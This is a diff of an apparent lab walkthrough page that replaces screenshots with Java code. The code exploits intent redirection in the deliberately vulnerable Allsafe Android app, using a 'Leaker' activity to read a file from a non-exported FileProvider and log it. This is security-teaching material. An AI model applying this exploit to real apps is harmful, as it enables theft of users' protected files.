@@ -830,11 +830,51 @@
         holds the required access rights, it can pass those rights to <code>com.example.infostealer.Leaker</code>
         through the intent, enabling it to access the protected content.
       </p>
-      <img src="./images/code1.png" alt="Intent code for accessing content provider">
+      <pre>
+        <code>
+          public class MainActivity extends AppCompatActivity {
+
+            private AppBarConfiguration appBarConfiguration;
+            private ActivityMainBinding binding;
+        
+            @Override
+            protected void onCreate(Bundle savedInstanceState) {
+                super.onCreate(savedInstanceState);
+                setContentView(R.layout.activity_main);
+        
+                Intent extra = new Intent();
+                extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                extra.setClassName(getPackageName(), "com.example.infostealer.Leaker");
+                extra.setData(Uri.parse("content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt"));
+        
+                Intent intent = new Intent();
+                intent.setComponent(new ComponentName("infosecadventures.allsafe", "infosecadventures.allsafe.ProxyActivity"));
+                intent.putExtra("extra_intent", extra);
+                startActivity(intent);
+            }
+        }
+        </code>
+      </pre>
 
 
-      <img src="./images/code2.png" alt="Leaked file access example using intent flags">
+     <pre>
+      <code>
+        public class Leaker extends AppCompatActivity {
 
+          @Override
+          protected void onCreate(Bundle savedInstanceState) {
+              super.onCreate(savedInstanceState);
+              setContentView(R.layout.activity_leaker);
+      
+              try {
+                  Log.d("Leaked File", IOUtils.toString( getContentResolver().openInputStream(getIntent().getData())) );
+              } catch (Exception e) {
+                  throw new RuntimeException(e);
+              }
+          }
+      }
+      </code>
+     </pre>
       <p>
         Finally, you can run the app and open Logcat in Android Studio to search for the "Leaked File" log. You’ll see
         that we successfully managed to read the <code>readme.txt</code> file via the non-exported file provider.
